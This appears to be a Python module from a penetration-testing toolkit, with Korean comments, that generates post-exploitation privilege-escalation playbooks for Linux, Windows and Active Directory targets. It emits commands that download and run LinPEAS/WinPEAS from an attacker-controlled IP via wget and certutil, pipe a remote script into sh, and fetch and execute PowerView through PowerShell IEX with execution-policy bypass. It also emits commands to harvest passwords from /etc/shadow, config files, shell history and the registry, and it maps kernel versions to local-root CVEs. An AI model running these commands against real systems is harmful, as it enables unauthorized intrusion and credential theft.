"""
권한 상승(Privilege Escalation) 플레이북 자동 준비 — 권한 확인 자산 전용
=======================================================================

OS(Linux/Windows/AD)에 맞춰 **포스트-익스플로잇 권한상승 열거·점검 체크리스트**를
'자동 생성'한다. 이 명령들은 **획득한 대상 셸 안에서** 실행하는 것으로, 에이전트는
아직 해당 셸이 없으므로(초기 침투 후 사용자 몫) **실행하지 않고 준비만** 한다
(리버스쉘·클라우드와 동일한 '생성 전용' 안전 경계). 전부 표준 라이브러리만.

구성:
  - 공통 열거(id/sudo/토큰) → 자동도구(LinPEAS/WinPEAS) → 벡터별 점검(SUID·cap·
    cron·서비스·토큰·커널) → 커널/소프트웨어 버전 → LPE CVE 후보 매핑.
  - `linux_steps` / `windows_steps` / `build` / `render` + `kernel_exploit_candidates`.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field


@dataclass
class PrivescStep:
    category: str          # 열거 / 자동도구 / SUID / 커널 / 토큰 ...
    command: str
    note: str = ""


@dataclass
class PrivescPlan:
    os_class: str = "unknown"
    steps: list[PrivescStep] = field(default_factory=list)
    cve_candidates: list[str] = field(default_factory=list)


def _peas_transfer(attacker_ip: str, kind: str) -> PrivescStep:
    """LinPEAS/WinPEAS 전송+실행(자동 열거 도구). 공격자 IP 알면 구체화."""
    if kind == "lin":
        if attacker_ip:
            cmd = (f"wget http://{attacker_ip}/linpeas.sh -O /tmp/lp.sh "
                   "&& chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.out")
        else:
            cmd = ("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/"
                   "download/linpeas.sh | sh    # (또는 공격자 HTTP 서버에서 전송)")
        return PrivescStep("자동도구", cmd, "LinPEAS 종합 자동 열거(가장 먼저 권장).")
    if attacker_ip:
        cmd = (f"certutil -urlcache -f http://{attacker_ip}/winPEASx64.exe "
               "%TEMP%\\wp.exe && %TEMP%\\wp.exe")
    else:
        cmd = ("winPEASx64.exe    # PEASS-ng 릴리스에서 전송 후 실행")
    return PrivescStep("자동도구", cmd, "WinPEAS 종합 자동 열거(가장 먼저 권장).")


def linux_steps(attacker_ip: str = "") -> list[PrivescStep]:
    return [
        PrivescStep("열거", "id; whoami; hostname; sudo -n -l 2>/dev/null; sudo -l",
                    "현재 권한·sudo 규칙(NOPASSWD/실행가능 바이너리 → GTFOBins 대조)."),
        _peas_transfer(attacker_ip, "lin"),
        PrivescStep("SUID/SGID",
                    "find / -perm -4000 -type f 2>/dev/null; "
                    "find / -perm -2000 -type f 2>/dev/null",
                    "비표준 SUID/SGID → GTFOBins(예: find/vim/nmap --interactive)."),
        PrivescStep("Capabilities", "getcap -r / 2>/dev/null",
                    "cap_setuid+ep 등 → GTFOBins capabilities 섹션."),
        PrivescStep("cron/스케줄",
                    "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; "
                    "cat /etc/cron.d/* 2>/dev/null",
                    "쓰기가능 스크립트·와일드카드 인젝션(tar/rsync)·PATH 하이재킹."),
        PrivescStep("쓰기가능",
                    "find / -writable -type f 2>/dev/null | grep -Ev '^/(proc|sys)'",
                    "쓰기가능 서비스 파일·스크립트·/etc/passwd 점검."),
        PrivescStep("NFS",
                    "cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null",
                    "no_root_squash → 로컬 SUID 바이너리 심기."),
        PrivescStep("커널/배포판", "uname -a; cat /etc/os-release 2>/dev/null | head -n2",
                    "커널/배포판 → 커널 LPE(DirtyPipe/DirtyCOW 등) 해당여부 판단."),
        PrivescStep("sudo 버전", "sudo --version | head -n1",
                    "CVE-2021-3156(Baron Samedit): <1.9.5p2 / 1.8.2~1.8.31p2."),
        PrivescStep("pkexec", "ls -l /usr/bin/pkexec 2>/dev/null; pkexec --version 2>/dev/null",
                    "CVE-2021-4034(PwnKit): SUID pkexec 존재 시 로컬 root 후보."),
        PrivescStep("민감파일/자격",
                    "ls -la /etc/passwd /etc/shadow; "
                    "grep -RiaE 'password|passwd|secret' /etc 2>/dev/null | head; "
                    "cat ~/.bash_history 2>/dev/null | tail -n20",
                    "쓰기가능 /etc/passwd·평문 자격(config/.bash_history). CWE-312/522."),
        PrivescStep("프로세스/소켓",
                    "ps aux --forest 2>/dev/null | head -n40; ss -lntup 2>/dev/null",
                    "root 프로세스·내부 전용 포트(측면 pivot/로컬 서비스 익스)."),
    ]


def windows_steps(os_class: str = "windows", attacker_ip: str = "") -> list[PrivescStep]:
    steps = [
        PrivescStep("열거", "whoami /all & whoami /priv & whoami /groups",
                    "SeImpersonate/SeAssignPrimaryToken → PotatoFamily"
                    "(PrintSpoofer/GodPotato). 그룹 과권한 확인."),
        _peas_transfer(attacker_ip, "win"),
        PrivescStep("시스템정보", "systeminfo",
                    "핫픽스 목록 → WES-NG(windows-exploit-suggester)로 커널 LPE 매핑."),
        PrivescStep("서비스",
                    "wmic service get name,displayname,pathname,startmode "
                    "| findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"",
                    "Unquoted Service Path·쓰기가능 바이너리(accesschk 로 ACL 확인)."),
        PrivescStep("AlwaysInstallElevated",
                    "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer "
                    "/v AlwaysInstallElevated & "
                    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer "
                    "/v AlwaysInstallElevated",
                    "둘 다 0x1 → 악성 .msi 로 SYSTEM."),
        PrivescStep("저장된 자격",
                    "cmdkey /list & "
                    "reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password",
                    "cmdkey/레지스트리/자동로그온 평문 자격. CWE-522."),
        PrivescStep("스케줄작업", "schtasks /query /fo LIST /v | findstr /i \"taskname run author\"",
                    "쓰기가능 작업 바이너리·고권한 실행 작업."),
    ]
    if os_class == "windows_ad":
        steps.append(PrivescStep(
            "AD",
            "powershell -ep bypass -c \"IEX(New-Object Net.WebClient)"
            ".DownloadString('http://%s/PowerView.ps1'); Get-DomainUser -SPN\""
            % (attacker_ip or "<ATTACKER>"),
            "BloodHound/PowerView 로 ACL·위임·Kerberoast 경로. 도구 전송 필요."))
    return steps


# 커널 버전 → LPE CVE 후보(간소 범위 판정). uname -r / uname -a 문자열 입력.
def kernel_exploit_candidates(uname: str) -> list[str]:
    out: list[str] = []
    m = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", uname or "")
    if not m:
        return out
    major, minor = int(m.group(1)), int(m.group(2))
    patch = int(m.group(3) or 0)
    ver = (major, minor, patch)
    # Dirty Pipe: 5.8 ~ 5.16.11 / 5.15.25 / 5.10.102 (간소: 5.8 이상 5.17 미만)
    if (5, 8, 0) <= (major, minor, 0) < (5, 17, 0):
        out.append("CVE-2022-0847 (Dirty Pipe) — 커널 5.8~5.16.x 계열 가능. 패치버전 확인.")
    # Dirty COW: < 4.8.3 (광범위)
    if ver < (4, 8, 3):
        out.append("CVE-2016-5195 (Dirty COW) — 커널 <4.8.3 광범위 해당.")
    # 오래된 커널 일반 경고
    if major < 4:
        out.append("구형 커널(<4.x) — 다수 공개 LPE 존재. searchsploit 'linux kernel %d.%d' 대조."
                   % (major, minor))
    return out


def build(os_class: str, attacker_ip: str = "",
          detected_cve: list[str] | None = None,
          kernel: str = "") -> PrivescPlan:
    """OS 클래스에 맞는 권한상승 플레이북 생성(생성 전용). unknown 이면 빈 플랜."""
    os_class = (os_class or "unknown").lower()
    if os_class == "linux":
        steps = linux_steps(attacker_ip)
    elif os_class in ("windows", "windows_ad"):
        steps = windows_steps(os_class, attacker_ip)
    else:
        return PrivescPlan(os_class=os_class)

    cands: list[str] = []
    if kernel:
        cands.extend(kernel_exploit_candidates(kernel))
    # 이미 탐지된 LPE 성격 CVE 를 후보로 승격(관측→권한상승 연결)
    _LPE = {
        "CVE-2021-4034": "PwnKit(pkexec) 로컬 root",
        "CVE-2021-3156": "Sudo Baron Samedit 로컬 root",
        "CVE-2022-0847": "Dirty Pipe 로컬 root",
        "CVE-2016-5195": "Dirty COW 로컬 root",
        "CVE-2021-34527": "PrintNightmare LPE/RCE",
        "CVE-2020-1472": "Zerologon DC 권한탈취",
    }
    for cve in (detected_cve or []):
        if cve in _LPE and f"{cve} ({_LPE[cve]})" not in cands:
            cands.append(f"{cve} ({_LPE[cve]}) — 관측에서 탐지됨, 우선 점검.")
    return PrivescPlan(os_class=os_class, steps=steps, cve_candidates=cands)


def render(os_class: str, attacker_ip: str = "") -> str:
    """사람이 보는 텍스트(블루/네이비 UI). 생성 전용 — 실행하지 않음."""
    from . import ui
    plan = build(os_class, attacker_ip)
    out = [ui.banner("권한 상승 플레이북 자동 준비 (권한 확인 자산 전용)")]
    if not plan.steps:
        out.append(ui.dim(f"OS 미상('{os_class}') — linux/windows/windows_ad 중 지정 필요."))
        return "\n".join(out)
    out.append(ui.dim(f"OS={plan.os_class}  ·  생성만 함(획득한 대상 셸에서 사용자가 직접 실행)\n"))
    for s in plan.steps:
        out.append(ui.accent2(f"[{s.category}]"))
        out.append("  " + s.command)
        if s.note:
            out.append(ui.dim("    " + s.note))
    if plan.cve_candidates:
        out.append(ui.rule("LPE CVE 후보"))
        for c in plan.cve_candidates:
            out.append(ui.bullet(c, "▸", "warn"))
    out.append(ui.dim("\n권한이 확인된 자산에서만 사용하세요. 출처: HackTricks/GTFOBins/PEASS-ng · NVD."))
    return "\n".join(out)
